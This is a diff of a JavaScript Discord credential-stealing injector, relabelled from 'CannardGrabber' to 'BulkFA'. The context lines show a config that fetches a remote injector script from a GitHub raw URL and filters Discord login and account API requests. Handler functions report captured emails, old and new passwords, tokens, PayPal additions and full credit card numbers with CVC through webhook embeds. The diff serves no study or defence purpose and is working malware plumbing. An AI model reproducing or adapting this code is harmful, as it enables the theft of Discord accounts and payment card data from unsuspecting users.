@@ -11,16 +11,15 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'CannardGrabber', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/985986698972373052/999720563905929346/static.png',
+  embed_name: 'BulkFA', 
+  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
   embed_color: 000000, 
   injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
       'https://discord.com/api/v*/users/@me',
-      'https://
-      .com/api/v*/users/@me',
+      'https://discordapp.com/api/v*/users/@me',
       'https://*.discord.com/api/v*/users/@me',
       'https://discordapp.com/api/v*/auth/login',
       'https://discord.com/api/v*/auth/login',
@@ -651,7 +650,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CannardGrabber',
+          text: 'BulkFA',
         },
         thumbnail: {
           url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
@@ -696,7 +695,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CannardGrabber',
+          text: 'BulkFA',
         },
       },
     ],
@@ -738,7 +737,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CannardGrabber',
+          text: 'BulkFA',
         },
       },
     ],
@@ -780,7 +779,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CannardGrabber',
+          text: 'BulkFA',
         },
       },
     ],
@@ -822,7 +821,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CannardGrabber',
+          text: 'BulkFA',
         },
       },
     ],
@@ -866,7 +865,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CannardGrabber',
+          text: 'BulkFA',
         },
       },
     ],
